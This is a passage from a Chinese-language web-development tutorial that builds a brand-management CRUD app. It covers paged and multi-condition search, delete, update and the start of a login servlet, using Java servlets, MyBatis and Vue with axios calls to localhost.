                <span class="hljs-comment">//     url: &#x27;http://localhost:8080/brand-case/brand/selectAll&#x27;</span>
                <span class="hljs-comment">// &#125;).then(function(response)&#123;</span>
                <span class="hljs-comment">//     var brandlist = response.data;</span>
                <span class="hljs-comment">//     _this.brandlist = brandlist;</span>
                <span class="hljs-comment">// &#125;)</span>

                <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
                axios(&#123;
                    method: <span class="hljs-string">&#x27;GET&#x27;</span>,
                    url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/selectByPage?currentpage=&#x27;</span>+ _this.currentPage + <span class="hljs-string">&#x27;&amp;pagesize=&#x27;</span> + _this.pageSize
                &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
                    <span class="hljs-comment">// 获取数据   &#123;rows: &#123; &#125;,totalCount:47&#125;</span>
                    <span class="hljs-keyword">var</span> brandlist = response.data.rows;
                    <span class="hljs-comment">// 设置表格数据</span>
                    _this.brandlist = brandlist;
                    <span class="hljs-comment">// 设置总记录数</span>
                    _this.totalCount = response.data.totalCount;
                &#125;)
            &#125;,</code></pre>

<h3 id="5-多条件分页查询"><a href="#5-多条件分页查询" class="headerlink" title="5.多条件分页查询"></a>5.多条件分页查询</h3><h4 id="需求分析-4"><a href="#需求分析-4" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>用户提交数据 状态 品牌名称 企业名称， 绑定到brand模型后作为参数提交为后端</li>
<li>三个条件的查询为and关系，并且对品牌和企业的查询需要使用模糊查询即需要like关键字</li>
<li>查询后依然需要分页显示，因此需要返回符合条件的数据外，还要返回对应的数量</li>
<li>可以根据分页查询修改代码</li>
</ul>
<h4 id="后端实现-4"><a href="#后端实现-4" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-4"><a href="#dao-4" class="headerlink" title="dao"></a>dao</h5><p>需要两个查询，<code>selelctByConditions</code>和<code>selectByConditionsCount</code></p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 多条件查询</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> begin</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> size</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-function">List&lt;Brand&gt; <span class="hljs-title">selectByConditions</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;brand&quot;)</span> Brand brand, <span class="hljs-meta">@Param(&quot;begin&quot;)</span> <span class="hljs-keyword">int</span> begin, <span class="hljs-meta">@Param(&quot;size&quot;)</span> <span class="hljs-keyword">int</span> size)</span></span>;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 多条件查询的记录条数</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">selectByConditionsCount</span><span class="hljs-params">(Brand brand)</span></span>;
</code></pre>

<p>在对应的<code>BrandMapper.xml</code>中实现具体的查询</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectByConditions&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.itheima.pojo.Brand&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;brandResultMap&quot;</span>&gt;</span>
    select * from tb_brand
    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>
        <span class="hljs-comment">&lt;!--这里有多个参数，访问brand数据实时需要使用brand.brandName--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.brandName != null and brand.brandName != &#x27;&#x27;&quot;</span>&gt;</span>
            and brand_name like #&#123;brand.brandName&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.companyName != null and brand.companyName != &#x27;&#x27;&quot;</span>&gt;</span>
            and company_name like #&#123;brand.companyName&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.status != null&quot;</span>&gt;</span>
            and status = #&#123;brand.status&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span>
    limit #&#123;begin&#125;, #&#123;size&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectByConditionsCount&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;java.lang.Integer&quot;</span>&gt;</span>
    select count(*) from tb_brand
    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>
         <span class="hljs-comment">&lt;!--这里为单个参数，访问brand数据实时需要使用#&#123;brandName&#125;--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brandName != null and brandName != &#x27;&#x27;&quot;</span>&gt;</span>
            and brand_name like #&#123;brandName&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;companyName != null and companyName != &#x27;&#x27;&quot;</span>&gt;</span>
            and company_name like #&#123;companyName&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null&quot;</span>&gt;</span>
            and status = #&#123;status&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>

<h5 id="service-4"><a href="#service-4" class="headerlink" title="service"></a>service</h5><p>在<code>BrandService</code>中实现多条件分页查询的业务逻辑</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 多条件分页查询</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> currentPage</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> pageSize</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">   */</span>
  <span class="hljs-function"><span class="hljs-keyword">public</span> PageBean&lt;Brand&gt; <span class="hljs-title">selectByConditionsPage</span><span class="hljs-params">(Brand brand, <span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span></span>&#123;
      SqlSession sqlSession = sqlSessionFactory.openSession();
      BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);

      <span class="hljs-keyword">int</span> begin = (currentPage - <span class="hljs-number">1</span>) * pageSize;
      <span class="hljs-keyword">int</span> size = pageSize;


      <span class="hljs-comment">// 对数据进行处理加上 % 模糊查询表达式</span>
      <span class="hljs-keyword">if</span>(brand.getBrandName() != <span class="hljs-keyword">null</span> &amp;&amp; brand.getBrandName().length() &gt; <span class="hljs-number">0</span> )&#123;
          brand.setBrandName(<span class="hljs-string">&quot;%&quot;</span> + brand.getBrandName() + <span class="hljs-string">&quot;%&quot;</span>);
      &#125;

      <span class="hljs-keyword">if</span>(brand.getCompanyName() != <span class="hljs-keyword">null</span> &amp;&amp; brand.getCompanyName().length() &gt; <span class="hljs-number">0</span>)&#123;
          brand.setCompanyName(<span class="hljs-string">&quot;%&quot;</span> + brand.getCompanyName() + <span class="hljs-string">&quot;%&quot;</span>);
      &#125;
      System.out.println(brand);

      List&lt;Brand&gt; rows = mapper.selectByConditions(brand, begin, size);

      <span class="hljs-keyword">int</span> totalCount = mapper.selectByConditionsCount(brand);

      PageBean&lt;Brand&gt; pageBean = <span class="hljs-keyword">new</span> PageBean&lt;&gt;();
      pageBean.setRows(rows);
      pageBean.setTotalCount(totalCount);

      sqlSession.close();

      <span class="hljs-keyword">return</span> pageBean;

  &#125;</code></pre>

<h5 id="servlet-4"><a href="#servlet-4" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 搜索</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">search</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
    <span class="hljs-comment">// 1.获取当前页码和每页展示条数 url?currentpage=1&amp;pagesize=5</span>
    String _currentpage = request.getParameter(<span class="hljs-string">&quot;currentpage&quot;</span>);
    String _pagesize = request.getParameter(<span class="hljs-string">&quot;pagesize&quot;</span>);
    <span class="hljs-keyword">int</span> currentpage = Integer.parseInt(_currentpage);
    <span class="hljs-keyword">int</span> pagesize = Integer.parseInt(_pagesize);

    <span class="hljs-comment">// 2.获取json字符串</span>
    BufferedReader reader = request.getReader();
    String line = reader.readLine();
    System.out.println(line);
    <span class="hljs-comment">// 3.将json字符串转为brand对象</span>
    Brand brand = JSON.parseObject(line, Brand.class);

    System.out.println(brand);
    <span class="hljs-comment">// 4.调用service方法 获取pageBean对象</span>
    PageBean&lt;Brand&gt; pageBean = service.selectByConditionsPage(brand, currentpage, pagesize);


    <span class="hljs-comment">// 5.将PageBean转为Json字符串</span>
    String string = JSON.toJSONString(pageBean);
    <span class="hljs-comment">// 6.发送响应数据</span>
    response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);
    response.getWriter().write(string);
&#125;</code></pre>

<h4 id="前端实现-4"><a href="#前端实现-4" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="获取查询条件"><a href="#获取查询条件" class="headerlink" title="获取查询条件"></a>获取查询条件</h5><p>查询表单绑定的模型为<code>searchBrand</code></p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-form</span> <span class="hljs-attr">:inline</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">:model</span>=<span class="hljs-string">&quot;searchBrand&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo-form-inline&quot;</span>&gt;</span></code></pre>

<p><code>searchBrand</code>数据如下</p>
<pre><code class="hljs js"><span class="hljs-comment">// 搜索数据</span>
             searchBrand:&#123;
                 status: <span class="hljs-string">&#x27;&#x27;</span>,
                 brandName: <span class="hljs-string">&#x27;&#x27;</span>,
                 companyName: <span class="hljs-string">&#x27;&#x27;</span>,
                 id:<span class="hljs-string">&quot;&quot;</span>,
                 ordered:<span class="hljs-string">&quot;&quot;</span>,
                 description:<span class="hljs-string">&quot;&quot;</span>
             &#125;,</code></pre>

<p>当用户输入条件后，数据自动绑定到<code>searchBrand</code>模型上，向后台提交数据时，提交<code>searchBrand</code>即可</p>
<h5 id="查询的异步请求"><a href="#查询的异步请求" class="headerlink" title="查询的异步请求"></a>查询的异步请求</h5><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">search</span>(<span class="hljs-params"></span>)</span>&#123;
           <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;

           axios(&#123;
               method: <span class="hljs-string">&#x27;POST&#x27;</span>,
               url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/search?currentpage=&#x27;</span>+ _this.currentPage + <span class="hljs-string">&#x27;&amp;pagesize=&#x27;</span> + _this.pageSize,
               data: <span class="hljs-built_in">this</span>.searchBrand
           &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
                   <span class="hljs-comment">// 获取数据   &#123;rows: &#123; &#125; &#125;</span>
                   <span class="hljs-comment">// 设置表格数据</span>
                   _this.brandlist = response.data.rows;
                   <span class="hljs-comment">// 设置总记录数</span>
                   _this.totalCount = response.data.totalCount;
                   _this.currentPage = <span class="hljs-number">1</span>;
           &#125;)
       &#125;</code></pre>



<h3 id="6-删除单条数据"><a href="#6-删除单条数据" class="headerlink" title="6.删除单条数据"></a>6.删除单条数据</h3><h4 id="需求分析-5"><a href="#需求分析-5" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>删除单条数据时需要携带该数据的id，使用get请求既可</li>
<li>获取id，可以使用<code>scope.row.id</code></li>
</ul>
<h4 id="后端实现-5"><a href="#后端实现-5" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-5"><a href="#dao-5" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 删除指定商品</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> id</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Delete(&quot;delete from tb_brand where id = #&#123;id&#125;&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deleteById</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;id&quot;)</span> <span class="hljs-keyword">int</span> id)</span></span>;</code></pre>

<h5 id="service-5"><a href="#service-5" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 删除指定数据</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> id</span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span></span>&#123;
    SqlSession sqlSession = sqlSessionFactory.openSession();
    BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);

    mapper.deleteById(id);
    sqlSession.commit();
    sqlSession.close();
&#125;</code></pre>

<h5 id="servlet-5"><a href="#servlet-5" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 删除指定数据</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteById</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;

    String _id = request.getParameter(<span class="hljs-string">&quot;id&quot;</span>);
    <span class="hljs-keyword">int</span> id = Integer.parseInt(_id);
    service.deleteById(id);
    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);

&#125;</code></pre>

<h4 id="前端实现-5"><a href="#前端实现-5" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="获取id"><a href="#获取id" class="headerlink" title="获取id"></a>获取id</h5><p><a href="https://blog.csdn.net/tg928600774/article/details/81945140">参考</a></p>
<p>在修改和删除按钮位置添加<code>slot-scope=&quot;scope&quot;</code></p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-row</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;update(scope.row)&quot;</span> &gt;</span>修改<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;danger&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;deleteById(scope.row.id)&quot;</span> &gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">el-row</span>&gt;</span></code></pre>

<p>使用<code>scope.row.id</code>即可获取到每行数据的id</p>
<h5 id="异步请求"><a href="#异步请求" class="headerlink" title="异步请求"></a>异步请求</h5><p>同样使用confirm组件提示用户是否真的想删除</p>
<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">deleteById</span>(<span class="hljs-params">id</span>)</span>&#123;
             <span class="hljs-built_in">this</span>.$confirm(<span class="hljs-string">&#x27;确定删除吗？&#x27;</span>, <span class="hljs-string">&#x27;确认信息&#x27;</span>, &#123;
                 distinguishCancelAndClose: <span class="hljs-literal">true</span>,
                 confirmButtonText: <span class="hljs-string">&#x27;确定&#x27;</span>,
                 cancelButtonText: <span class="hljs-string">&#x27;取消&#x27;</span>
             &#125;).then(<span class="hljs-function">() =&gt;</span> &#123;
                 <span class="hljs-built_in">this</span>.currentPage=<span class="hljs-number">1</span>
                 <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
                 <span class="hljs-keyword">var</span> deleteId = id;
                 axios(&#123;
                     method: <span class="hljs-string">&#x27;get&#x27;</span>,
                     url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/deleteById?id=&#x27;</span>+deleteId,
                 &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
                     <span class="hljs-keyword">if</span>(response.data == <span class="hljs-string">&quot;success&quot;</span>)&#123;
                         <span class="hljs-comment">// 重新查询数据</span>
                         _this.selectAll();
                         <span class="hljs-comment">//显示提示框</span>
                         _this.$message(&#123;
                             type: <span class="hljs-string">&#x27;success&#x27;</span>,
                             message: <span class="hljs-string">&#x27;删除成功&#x27;</span>
                         &#125;);
                     &#125;
                 &#125;)
             &#125;).catch(<span class="hljs-function">() =&gt;</span> &#123;
                 <span class="hljs-built_in">this</span>.$message(&#123;
                     type: <span class="hljs-string">&#x27;info&#x27;</span>,
                     message: <span class="hljs-string">&quot;取消删除&quot;</span>
                 &#125;)
             &#125;)
         &#125;,</code></pre>

<h3 id="7-修改"><a href="#7-修改" class="headerlink" title="7.修改"></a>7.修改</h3><h4 id="需求分析-6"><a href="#需求分析-6" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>修改与添加类似，需要弹出对话框后进行数据的编辑</li>
<li>如何获取每行的数据，使用<code>scope.row</code>即可</li>
<li>请求数据为json数据，后台接收后将其转换为Brand类型后进行更新操作</li>
</ul>
<h4 id="后端实现-6"><a href="#后端实现-6" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-6"><a href="#dao-6" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 更新数据</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Update(&quot;update tb_brand set brand_name = #&#123;brandName&#125;,company_name = #&#123;companyName&#125;,ordered = #&#123;ordered&#125;,description = #&#123;description&#125;,status = #&#123;status&#125; where id = #&#123;id&#125;&quot;)</span>
<span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(Brand brand)</span></span>;</code></pre>

<h5 id="service-6"><a href="#service-6" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 更新数据</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(Brand brand)</span></span>&#123;
    SqlSession sqlSession = sqlSessionFactory.openSession();
    BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);

    mapper.update(brand);
    sqlSession.commit();
    sqlSession.close();
&#125;</code></pre>

<h5 id="servlet-6"><a href="#servlet-6" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 更新</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;


    BufferedReader reader = request.getReader();
    String line = reader.readLine();
    System.out.println(line);
    Brand brand = JSON.parseObject(line, Brand.class);
    System.out.println(brand);
    service.update(brand);

    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);
&#125;</code></pre>

<h4 id="前端实现-6"><a href="#前端实现-6" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="修改对话框"><a href="#修改对话框" class="headerlink" title="修改对话框"></a>修改对话框</h5><p>该对话框与增加对话的实现相同，不过该对话框初始时需要显示数据</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;update(scope.row)&quot;</span> &gt;</span>修改<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre>

<p>update函数的实现</p>
<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">update</span>(<span class="hljs-params">data</span>)</span>&#123;
              <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
              <span class="hljs-built_in">this</span>.dialogUpdateVisible = <span class="hljs-literal">true</span>;
              <span class="hljs-built_in">this</span>.updateBrand.brandName = data.brandName;
              <span class="hljs-built_in">this</span>.updateBrand.companyName = data.companyName;
              <span class="hljs-built_in">this</span>.updateBrand.status = data.status;
              <span class="hljs-built_in">this</span>.updateBrand.ordered = data.ordered;
              <span class="hljs-built_in">this</span>.updateBrand.description = data.description;
              <span class="hljs-built_in">this</span>.updateBrand.statusStr = data.statusStr;
          &#125;,</code></pre>

<p>updateBrand定义</p>
<pre><code class="hljs java">data() &#123;
           <span class="hljs-keyword">return</span> &#123;
               <span class="hljs-comment">//带修改的数据</span>
               updateBrand:&#123;
                   <span class="hljs-string">&quot;brandName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
                   <span class="hljs-string">&quot;companyName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
                   <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
                   <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,
                   <span class="hljs-string">&quot;ordered&quot;</span>: <span class="hljs-number">0</span>,
                   <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-number">0</span>,
                   <span class="hljs-string">&quot;statusStr&quot;</span>: <span class="hljs-string">&quot;&quot;</span>
               &#125;,
   &#125;</code></pre>

<h5 id="异步请求实现"><a href="#异步请求实现" class="headerlink" title="异步请求实现"></a>异步请求实现</h5><p>修改对话框的提交按钮位置</p>
<pre><code class="hljs html">
<span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateSubmit&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
    <span class="hljs-comment">&lt;!--取消 只需要将dialogVisble设置为false即可隐藏对话框--&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogUpdateVisible = false&quot;</span>&gt;</span>取消<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span></code></pre>

<pre><code class="hljs js"><span class="hljs-comment">// 修改</span>
<span class="hljs-function"><span class="hljs-title">updateSubmit</span>(<span class="hljs-params"></span>)</span>&#123;
    <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;

    axios(&#123;
        method:<span class="hljs-string">&#x27;POST&#x27;</span>,
        url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/update&#x27;</span>,
        data: _this.updateBrand
    &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
        <span class="hljs-keyword">if</span>(response.data == <span class="hljs-string">&quot;success&quot;</span>)&#123;
            _this.dialogUpdateVisible = <span class="hljs-literal">false</span>;
            _this.selectAll();
            _this.msgbox(<span class="hljs-string">&quot;修改成功！&quot;</span>);
        &#125;
    &#125;)
&#125;,</code></pre>



<h2 id="登录注册功能实现"><a href="#登录注册功能实现" class="headerlink" title="登录注册功能实现"></a>登录注册功能实现</h2><h3 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h3><h4 id="后端实现-7"><a href="#后端实现-7" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-7"><a href="#dao-7" class="headerlink" title="dao"></a>dao</h5><p>在<code>src/main/java/com/itheima/mapper</code>创建<code>UserMapper</code>接口</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.mapper;

<span class="hljs-keyword">import</span> com.itheima.pojo.User;
<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Insert;
<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Param;
<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Select;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserMapper</span> </span>&#123;
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 用户登录</span>
<span class="hljs-comment">     * 检查用户名和密码是否正确</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> username</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> password</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125; and password = #&#123;password&#125;&quot;)</span>
    <span class="hljs-function">User <span class="hljs-title">select</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username, <span class="hljs-meta">@Param(&quot;password&quot;)</span> String password)</span></span>;

&#125;
</code></pre>

<h5 id="service-7"><a href="#service-7" class="headerlink" title="service"></a>service</h5><p>在<code>src/main/java/com/itheima/service</code>中创建<code>UserService</code>类</p>
<pre><code class="hljs java">SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory();

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 用户登录方法</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> username</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> password</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">Login</span><span class="hljs-params">(String username, String password)</span></span>&#123;
    SqlSession session = sqlSessionFactory.openSession();
    UserMapper mapper = session.getMapper(UserMapper.class);
    User user = mapper.select(username, password);

    <span class="hljs-keyword">if</span>(user != <span class="hljs-keyword">null</span>)&#123;
        <span class="hljs-keyword">return</span> user;
    &#125;<span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
    &#125;
&#125;
</code></pre>

<h5 id="servlet-7"><a href="#servlet-7" class="headerlink" title="servlet"></a>servlet</h5><p>在<code>src/main/java/com/itheima/servler/web</code>中创建<code>LoginServlet</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;

<span class="hljs-keyword">import</span> com.itheima.pojo.User;
<span class="hljs-keyword">import</span> com.itheima.service.UserService;

<span class="hljs-keyword">import</span> javax.servlet.ServletException;
<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.*;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-meta">@WebServlet(value = &quot;/login&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
    <span class="hljs-comment">// 因为BrandService可能多次用到 所以变成成员变量 减少创建的次数</span>
